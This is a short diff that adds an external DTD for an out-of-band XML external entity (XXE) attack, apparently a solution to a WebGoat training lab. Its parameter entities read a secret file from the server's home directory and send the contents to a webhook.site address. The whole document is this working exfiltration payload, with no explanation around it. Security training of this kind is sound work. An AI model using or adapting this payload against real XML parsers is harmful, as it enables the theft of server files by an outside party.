@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///home/webgoat/.webgoat-8.2.0/XXE/secret.txt">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://webhook.site/2a010e1b-1a21-4d11-ae7f-70328e6e0102/?x=%file;'>">
+%eval;
+%exfil;
